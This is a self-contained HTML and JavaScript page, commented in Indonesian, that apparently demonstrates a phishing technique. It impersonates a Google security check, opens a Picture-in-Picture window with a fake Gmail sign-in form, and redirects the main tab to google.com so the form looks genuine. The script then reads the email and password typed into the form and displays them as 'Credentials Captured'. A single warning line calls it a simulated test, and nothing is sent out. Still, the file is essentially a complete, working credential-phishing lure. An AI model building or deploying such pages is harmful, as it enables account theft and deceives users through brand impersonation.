<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }
  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }

  /* Konten PiP */
  #pipContent {
    display: none;
    padding: 20px;
    background: #fff;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  }
  #pipContent .g-logo {
    text-align: center;
    font-size: 24px;
    font-weight: bold;
    color: #4285f4;
    margin-bottom: 20px;
  }
  #pipContent h3 { font-size: 18px; margin-bottom: 10px; text-align: center; }
  #pipContent p { font-size: 13px; color: #666; text-align: center; margin-bottom: 20px; }
  #pipContent input {
    width: 100%;
    padding: 12px;
    margin-bottom: 12px;
    border: 1px solid #ddd;
    border-radius: 6px;
    font-size: 14px;
  }
  #pipContent button {
    width: 100%;
    padding: 12px;
    background: #1a73e8;
    color: #fff;
    border: none;
    border-radius: 6px;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
  }
  #pipContent .warning {
    margin-top: 15px;
    font-size: 11px;
    color: #f00;
    text-align: center;
  }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Verification</h2>
  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diminta mengisi formulir.</p>
  <button id="startBtn">Verify Account</button>
  <div id="status">[*] Ready...</div>
</div>

<!-- Konten untuk PiP -->
<div id="pipContent">
  <div class="g-logo">G</div>
  <h3>Sign in</h3>
  <p>to continue to Gmail</p>
  <input type="email" id="pipEmail" placeholder="Email or phone" autofocus />
  <input type="password" id="pipPassword" placeholder="Password" />
  <button id="pipLogin">Next</button>
  <div class="warning">This is a simulated phishing test. Do not enter real credentials.</div>
</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');
  var pipContent = document.getElementById('pipContent');

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[PiP Race] " + msg);
  }

  // ============================================
  // 1. TRIGGER (KLIK) - RACE CONDITION
  // ============================================
  btn.addEventListener('click', async function() {
    log("[*] Memulai race condition: PiP + Google.com...");

    // ============================================
    // A. BUKA PiP & REDIRECT BERSAMAAN (0ms)
    // ============================================
    
    // 1. Buka PiP (async)
    const pipPromise = (async () => {
      try {
        if (!window.documentPictureInPicture) {
          alert("Document Picture-in-Picture tidak didukung.");
          return null;
        }
        const pipWindow = await documentPictureInPicture.requestWindow({
          width: 400,
          height: 500
        });
        
        // Pindahkan konten phishing ke PiP
        pipContent.style.display = 'block';
        pipWindow.document.body.append(pipContent);
        return pipWindow;
      } catch (e) {
        log("PiP Error: " + e.message);
        return null;
      }
    })();

    // 2. REDIRECT KE GOOGLE.COM (LANGSUNG, 0ms)
    try {
      window.location.href = "https://www.google.com";
    } catch (e) {}

    // 3. Tunggu PiP siap (jika berhasil)
    const pipWindow = await pipPromise;
    if (pipWindow) {
      log('PiP Window Opened. Form login palsu ditampilkan.');

      // Event listener di PiP
      pipWindow.document.getElementById('pipLogin').addEventListener('click', function() {
        var email = pipWindow.document.getElementById('pipEmail').value;
        var password = pipWindow.document.getElementById('pipPassword').value;

        if (!email || !password) {
          alert("Email dan password harus diisi!");
          return;
        }

        log("Captured: " + email + " / " + password);

        // Tampilkan data di halaman utama
        statusEl.innerHTML = `
          <div style="background:#000;color:#0f0;padding:10px;border-radius:6px;margin-top:10px;">
            <strong>Credentials Captured:</strong><br>
            Email: ${email}<br>
            Password: ${password}<br>
            <em>Redirecting to Google...</em>
          </div>
        `;

        // Redirect PiP ke Google asli
        pipWindow.location.href = "https://www.google.com";

        // Tutup PiP setelah 2 detik
        setTimeout(function() {
          pipWindow.close();
        }, 2000);
      });
    }

  }, { once: true });

})();
</script>

</body>
</html>
